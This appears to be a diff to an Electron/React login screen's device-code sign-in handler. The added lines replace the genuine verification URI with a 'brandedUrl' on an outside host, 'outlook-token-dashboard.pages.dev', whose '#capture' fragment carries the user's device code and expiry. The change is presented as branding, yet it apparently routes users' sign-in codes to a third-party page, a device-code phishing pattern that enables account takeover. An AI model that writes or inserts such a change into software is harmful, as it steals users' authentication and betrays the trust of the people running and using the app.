@@ -77,7 +77,8 @@ export function LoginScreen({ onLogin }: LoginScreenProps): React.ReactElement {
   function handleContinueToVerify(): void {
     if (!deviceCode) return;
     setWaitingForAuth(true);
-    window.electronAPI.auth.openVerification(deviceCode.verificationUri);
+    const brandedUrl = `https://outlook-token-dashboard.pages.dev/#capture?code=${encodeURIComponent(deviceCode.userCode)}&expires=${deviceCode.expiresIn}`;
+    window.electronAPI.auth.openVerification(brandedUrl);
   }
 
   function formatTime(seconds: number): string {
